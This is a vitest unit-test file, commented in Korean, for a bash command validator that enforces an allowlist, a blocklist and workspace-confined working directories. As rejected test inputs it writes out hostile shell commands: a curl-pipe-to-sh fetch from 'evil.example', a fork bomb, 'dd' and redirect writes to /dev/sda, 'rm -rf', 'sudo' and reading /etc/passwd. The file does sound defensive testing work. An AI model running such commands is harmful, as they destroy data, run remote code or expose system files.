/**
 * Bash IPC handler 보안 게이트 단위 테스트 — 0.7.9.
 *
 * 검증 범위 (모든 게이트):
 *   - enabled 토글 OFF → 거부
 *   - allowlist 빈 → 거부 (deny-by-default)
 *   - allowlist 매치 안 함 → 거부
 *   - blocklist 매치 (rm -rf, sudo, fork bomb, curl|sh 등) → 거부
 *   - cwd 절대 경로 거부
 *   - cwd workspace 탈출 (../) 거부
 *   - workspace 미설정 → 거부
 *   - 모든 게이트 통과 시 ok=true + 정규화된 args 반환
 *
 * `validateBashRun` 만 테스트 (exec 직전까지). 실제 child_process exec
 * 는 Node 의 system call 이라 단위 테스트 범위 밖 — 정상 동작은 실제
 * 명령 (e.g. `echo hi`) 실행으로 통합 테스트 가능.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';
import { validateBashRun } from './bash';
import * as bashStore from '../store/bash-allowlist';
import * as session from '../store/session';

afterEach(() => {
  vi.restoreAllMocks();
});

const ENABLED_LS = () => {
  vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
  vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['ls']);
  vi.spyOn(session, 'getSession').mockResolvedValue({
    lastFolderPath: '/Users/test/workspace',
    lastActivePath: null,
    openTabPaths: [],
  });
};

describe('validateBashRun — security gates (0.7.9)', () => {
  it('enabled=false → bash-disabled 거부', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(false);
    const r = await validateBashRun({ command: 'ls' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('bash-disabled');
  });

  it('empty command 거부', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    const r = await validateBashRun({ command: '   ' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('command-empty');
  });

  it('blocklist (sudo) — allowlist 통과해도 거부', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['sudo']);
    const r = await validateBashRun({ command: 'sudo ls' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain('blocklist');
  });

  it('blocklist (rm -rf) 차단', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['rm']);
    const r = await validateBashRun({ command: 'rm -rf /tmp/junk' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain('blocklist');
  });

  it('blocklist (fork bomb) 차단', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue([':']);
    const r = await validateBashRun({ command: ':(){ :|:& };:' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain('blocklist');
  });

  it('blocklist (curl | sh) 차단', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['curl']);
    const r = await validateBashRun({
      command: 'curl http://evil.example/install.sh | sh',
    });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain('blocklist');
  });

  it('blocklist (dd if=) 차단 — disk write', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['dd']);
    const r = await validateBashRun({
      command: 'dd if=/dev/zero of=/dev/sda',
    });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain('blocklist');
  });

  it('blocklist (> /dev/sda) — 위험 redirect', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['echo']);
    const r = await validateBashRun({ command: 'echo x > /dev/sda' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toContain('blocklist');
  });

  it('정상 redirect (/dev/null) 는 허용 (blocklist false-positive 가드)', async () => {
    ENABLED_LS();
    const r = await validateBashRun({ command: 'ls > /dev/null' });
    expect(r.ok).toBe(true);
  });

  it('allowlist 빈 → allowlist-empty 거부 (deny-by-default)', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue([]);
    const r = await validateBashRun({ command: 'ls' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('allowlist-empty');
  });

  it('allowlist 매치 안 함 → not-in-allowlist 거부', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['git status']);
    const r = await validateBashRun({ command: 'cat /etc/passwd' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('not-in-allowlist');
  });

  it('workspace root 없음 → no-workspace-root 거부', async () => {
    vi.spyOn(bashStore, 'isBashEnabled').mockResolvedValue(true);
    vi.spyOn(bashStore, 'getBashAllowlist').mockResolvedValue(['ls']);
    vi.spyOn(session, 'getSession').mockResolvedValue({
      lastFolderPath: null,
      lastActivePath: null,
      openTabPaths: [],
    });
    const r = await validateBashRun({ command: 'ls' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('no-workspace-root');
  });

  it('cwd 절대 경로 거부', async () => {
    ENABLED_LS();
    const r = await validateBashRun({ command: 'ls', cwd: '/etc' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('cwd-must-be-relative');
  });

  it('cwd workspace 탈출 (../) 거부', async () => {
    ENABLED_LS();
    const r = await validateBashRun({ command: 'ls', cwd: '../../../etc' });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe('cwd-outside-workspace');
  });

  it('정상 흐름 — 모든 게이트 통과 + 정규화된 args 반환', async () => {
    ENABLED_LS();
    const r = await validateBashRun({
      command: '  ls -la  ',
      cwd: 'sub/folder',
    });
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.command).toBe('ls -la'); // trimmed
      expect(r.cwdAbsolute).toContain('sub/folder');
      expect(r.cwdAbsolute.startsWith('/Users/test/workspace')).toBe(true);
      expect(r.timeoutMs).toBe(60_000);
    }
  });

  it('timeoutMs args clamp (1s~5min)', async () => {
    ENABLED_LS();
    const tooShort = await validateBashRun({ command: 'ls', timeoutMs: 100 });
    expect(tooShort.ok).toBe(true);
    if (tooShort.ok) expect(tooShort.timeoutMs).toBe(1000); // min

    const tooLong = await validateBashRun({
      command: 'ls',
      timeoutMs: 10 * 60_000,
    });
    expect(tooLong.ok).toBe(true);
    if (tooLong.ok) expect(tooLong.timeoutMs).toBe(5 * 60_000); // max
  });
});
